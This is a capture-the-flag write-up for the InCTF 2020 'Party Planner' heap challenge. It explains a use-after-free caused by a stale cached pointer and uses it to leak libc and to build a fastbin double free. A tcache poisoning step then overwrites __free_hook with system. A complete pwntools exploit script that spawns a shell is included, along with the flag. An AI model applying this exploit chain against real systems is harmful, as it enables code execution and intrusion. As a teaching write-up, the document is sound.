# InCTF 2020

High quality CTF from bi0s.

I played with :game_die:, and we got 2nd.

During the CTF I realized that I like harder pwn a lot more than harder web.

## Party Planner

We are given the linker, libc, and binary.

The challenge uses glibc 2.29, with full security protections, so it's a heap exploit.

We get a menu with 9 options:
- Create a house
- Create a person
- Add person to house
- Remove person to house
- View house
- View person
- Party
- Destroy house
- Give up (exit)

The program maintains two arrays, an array of houses, and an array of free agents (people that haven't been assigned to a house).

The program also maintains a "cache" person pointer. The pointer is updated on viewing / deleting a person.


### Houses
We can only make two houses, and the limit on each house is 10 people. We can choose the name of each house on creation.

We can add people, remove people, and party to remove everyone who hasn't been removed.

We can also view a house for information on everybody inside, and view a specific person inside a house.

Each house chunk (0x30 sized) contains:
- a pointer to its name chunk
- a pointer to its description chunk
- an array of pointers for person i at index i, or NULL if no person


### People
We can make up to 20 free agent people.

Each person chunk is of fixed size, but we can choose what size to allocate a description chunk. We can also write to the description chunk after its been allocated.

Each person chunk (0x30 sized) contains:
- a char array for its name
- a pointer to its description chunk
- an int describing if the chunk is in use
- an int describing its index in a house (0 before adding to a house)

Each person must have a description of less than 0x500 size, which includes unsorted bin size (tcache goes up to 0x410).

When we add a person to a house, the program removes the specified person from the free agents and puts them into the first available slot in the specified house. If the specified free agent does not exist, the program exits.

People in houses are zero-indexed, so the last person in a full house will have id 9.

There are pretty tight restrictions on what we can free, as everything is zeroed out properly (or is it?).


### UAF

Recall that there is a cache person pointer that is set on view. How does this play into deletions?

Here is relevant Ghidra decomp for deleting a person from a house:

```c
void remove_person_from_house(void){
  uint house_num;
  uint person_num;
  
  printf("Which House (0 or 1) ? : ");
  house_num = read_num();
  if ((house_ptr_arr[house_num] == (house *)0x0) || (1 < house_num)) {
    error("No such House");
  }
  printf("Enter the Person number : ");
  person_num = read_num();
  if (person_chunk == (person *)0x0) {
    if (house_num == 0) {
      if (house0_people[person_num] == (person *)0x0) {
        error("No such Person");
      }
      person_chunk = house0_people[person_num];
    }
    else {
      if (house1_people[person_num] == (person *)0x0) {
        error("No such Person");
      }
      person_chunk = house1_people[person_num];
    }
  }
  if (house_num == 0) {
    if (person_chunk->in_use == 0) {
      error("Something went wrong");
    }
    person_chunk->in_use = 0;
    free(person_chunk->desc);
    free(person_chunk);
    house0_people[person_num] = (person *)0x0;
  }
  else {
    if (person_chunk->in_use == 0) {
      error("Something went wrong");
    }
    person_chunk->in_use = 0;
    free(person_chunk->desc);
    free(person_chunk);
    house1_people[person_num] = (person *)0x0;
  }
  person_chunk = (person *)0x0;
  return;
}
```


On deletion, if the `person_chunk` (cache chunk) is null, `person_chunk` will be set to the selected chunk. However, if `person_chunk` is NOT null, person_chunk will not be changed and the program proceeds.

It then checks if `person_chunk` is in use, presumably to prevent a double free. If not, it exits.

If the chunk is in use, it sets `person_chunk` to be free, then frees its description and the chunk itself.

However, take a look at the zero-ing logic (lines 33, 42). It zeroes out the chunk at index `person_num` in the selected house, which may be different than what `person_chunk` is, due to it not being set properly before.

So, we can now trick the program into thinking a chunk is in use, when it's actually been freed.

### Bug

This presents a UAF: Suppose we have 3 chunks in house 0.

We view chunk 3, which sets `person_chunk` to chunk 3.

We then request to delete chunk 2 from house 0. Because `person_chunk` is not null, it will call `free()` on chunk 3, but null out the chunk 2 pointer in house 0's array.

Now, person 3 will be on some freelist, but the contents will still be printed, allowing for leaks from the `fwd` pointer as it's free.


### Libc Leak

Leaking libc is fairly trivial after the UAF:

- Create house 0, named whatever
- Add 3+ 0x480 sized chunks to house 0
- View the last chunk
- Request to delete the second to last chunk
- View the house


This will place a chunk into unsorted bin, and the last element in house 0's array will point to it, allow us to leak libc by viewing the house.


### Dup / Arbitrary write

Getting an arbitrary write was a bit harder.

Because glibc 2.29 patches the easy tcache dup to poison, we should use fastbins.

Fastbins still allow double frees as they only check if the head of the list is the same as the chunk that is being freed.

So, we can get a 1->2->1 double free.

Unfortunately, we can't directly free `person_chunk` twice in any case, as `person_chunk` gets set to not in use and the `person_chunk` pointer gets zeroed after deleting.

Luckily, we can use the party function. Here is relevant code:
```c
if (uVar1 == 0) {
  local_14 = 0;
  while (local_14 < 10) {
    if (house0_people[local_14] != (person *)0x0) {
      free(house0_people[local_14]->desc);
      free(house0_people[local_14]);
      house0_people[local_14] = (person *)0x0;
    }
    local_14 = local_14 + 1;
  }
}
else {
  local_10 = 0;
  while (local_10 < 10) {
    if (house1_people[local_10] != (person *)0x0) {
      free(house1_people[local_10]->desc);
      free(house1_people[local_10]);
      house1_people[local_10] = (person *)0x0;
    }
    local_10 = local_10 + 1;
  }
}
puts("\n\nParty is over\nAll people have left\n");
```

It loops through the specified house and frees everything that isn't null, then nulls the pointer out. Notice how it doesn't check if the chunk is marked as in use or not.

Practically, house 0 is messed up and we don't want to spend time trying to fix it, so let's just use house 1 for the write :)

So, we need to:
- Create house 1, and name it `/bin/sh`
- Add 10 0x60 description sized people to house 1
- Free 7 to fill tcache
- View person 9
- Delete 8 (really frees 9 and nulls 8)
- Delete 7 (frees 7 and nulls 7)
- Party to free 9 without triggering the in-use check

After this, our 0x60 fastbin looks like:
`9 -> 7 -> 9`

We then need to empty out the 0x60 tcache bin by creating 7 people with description size 0x60.

Then, we start pulling from the fastbin.

Create a person with desc size 0x60, and write libc's `__free_hook` to both its name and description. This pulls chunk 9 from the fastbin head, and writes to its `fwd` ptr, which affects the chunk 9 at the tail.

We write both name and description to the chunk because we are also tcache poisoning the freelist for the person chunks themselves (0x30), so we need a place to write to that won't segfault.

You may notice that the fastbin got moved to the tcache. This is normal as glibc does this when the tcache for a size is empty and there are chunks in the corresponding fastbin.

Now, our tcache bin for 0x60 looks like `7 -> 9 -> <__free_hook>`.

Simply create three more people with desc size 0x60. On the last person, write their description as the `p64()` of `system()`.

Then, we can go and delete something with `/bin/sh` in it. Recall that we chose to name house 1 as `/bin/sh`, so we can just go and delete house1, spawning a shell.

Script:

```python
from pwn import *

e = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
#p = remote("35.245.143.0", 5555)

#context.log_level="debug"
gdb.attach(p, """c""")


def create_house(name, size, desc):
	print("create")
	p.sendlineafter(">> ", "1")
	p.sendlineafter(": ", name)
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", desc)


def create_person(name, size, desc):
	print("create")
	p.sendlineafter(">> ", "2")
	p.sendlineafter(": ", name)
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", desc)


def add(idx, house):
	print("add")
	p.sendlineafter(">> ", "3")
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(house))


def remove(house, idx):
	print("remove")
	p.sendlineafter(">> ", "4")
	p.sendlineafter(": ", str(house))
	p.sendlineafter(": ", str(idx))


def view_house(idx):
	print("view house")
	p.sendlineafter(">> ", "5")
	p.sendlineafter(": ", str(idx))


def view_person(house, idx):
	print("view person")
	p.sendlineafter(">> ", "6")
	p.sendlineafter(": ", str(house))
	p.sendlineafter(": ", str(idx))


def party(house):
	print("party")
	p.sendlineafter(">> ", "7")
	p.sendlineafter(": ", str(house))


def destroy(house):
	print("destroy")
	p.sendlineafter(">> ", "8")
	p.sendlineafter(": ", str(house))



create_house("AAAA", 5, "AAAA")
create_house("/bin/sh", 5, "ls")




for i in range(7):
	create_person("IIII", 0x480, "DDDD")
	add(0, 0)


create_person("AAAA", 0x10, "AAAA")


view_person(0, 6)


remove(0, 5)

view_house(0)



for i in range(28):
	p.recvline()


dat = p.recvline().strip().split(" ", 8)	# libc leak here


libc.address = u64(dat[-1].ljust(8, "\x00")) - 0x1e4ca0


print("libc address", hex(libc.address))


for i in range(10):
	create_person("A", 0x60, "B")
	add(1, 1)


for i in range(7):
	remove(1, i)



view_house(1)


view_person(1, 9)
remove(1, 8)
remove(1, 7)

party(1)


print("malloc hook", hex(libc.sym["__malloc_hook"]))
print("free hook", hex(libc.sym["__free_hook"]))


for i in range(7):
	create_person("A", 0x60, "iiii")



create_person(p64(libc.sym["__free_hook"]), 0x60, p64(libc.sym["__free_hook"]))



create_person("A", 0x60, "AAAA")
create_person("A", 0x60, "AAAA")


create_person(p64(libc.sym["system"]), 0x60, p64(libc.sym["system"]))



destroy(1)




p.interactive()
```


Flag: `inctf{m3h_th4t_w4s_a_trivial_bug_7734736f615f472}`
